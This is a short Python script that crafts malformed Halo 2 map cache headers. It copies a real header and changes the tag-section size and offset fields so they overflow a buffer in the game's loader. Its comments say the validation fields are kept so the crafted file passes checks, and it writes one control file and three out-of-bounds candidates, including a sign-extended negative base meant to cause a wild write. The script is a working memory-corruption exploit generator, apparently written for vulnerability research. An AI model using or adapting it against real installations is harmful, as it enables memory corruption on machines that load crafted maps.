#!/usr/bin/env python3
"""Craft 0x380-byte Halo2 cache headers from a real map's header, mutating only
the tag-section size/offset fields that the loader at 0x6c9970 fails to bound.
All magic/version/name/footer fields are preserved so the header passes
validation.  Usage: mk_header.py <real.map> <outdir>"""
import sys, struct, os

def craft(base, mut):
    b=bytearray(base[:0x380])
    for off,val in mut.items():
        struct.pack_into("<i", b, off, val)
    return bytes(b)

real=open(sys.argv[1],"rb").read(0x380)
outdir=sys.argv[2]; os.makedirs(outdir,exist_ok=True)

def put(name,data,note):
    p=os.path.join(outdir,name)
    open(p,"wb").write(data)
    print(f"  {name}: {note}")

# clear compression flag bit0 of +0x1c for the 'uncompressed custom map' model
import struct as _s
f1c=_s.unpack_from("<I",real,0x1c)[0] & ~1

# baseline: exactly the real header (compression bit left as-is) -> no overflow
put("hdr_baseline.bin", real, "unmodified ascension header (control)")

# candidate #1: alloc sized by +0x14 (=0), read sized by +0x2d4 (=0x4000),
#   placed at +0x2d0 (=0x1000) -> alloc 0x1000, write 0x4000 at tagmem+0x1000.
put("hdr_oob1.bin",
    craft(real, {0x1c:f1c, 0x14:0x0, 0x2d0:0x1000, 0x2d4:0x4000, 0x10:0x0}),
    "+0x14=0 (alloc small), +0x2d4=0x4000 (read big), +0x2d0=0x1000 base -> dst overruns alloc")

# candidate #1b: keep +0x2d0 large like a real map, shrink +0x14 only
put("hdr_oob1b.bin",
    craft(real, {0x1c:f1c, 0x14:0x1000, 0x2d4:0x400000}),
    "+0x14=0x1000 small alloc tail, +0x2d4=0x400000 huge read -> overrun")

# candidate #2: +0x2d0 sign-extend. set high bit -> movsxd negative base.
put("hdr_oob2.bin",
    craft(real, {0x1c:f1c, 0x2d0:-0x10000000}),  # 0xf0000000 as signed
    "+0x2d0=0xf0000000 -> movsxd negative virtual base -> wild dst / huge alloc")
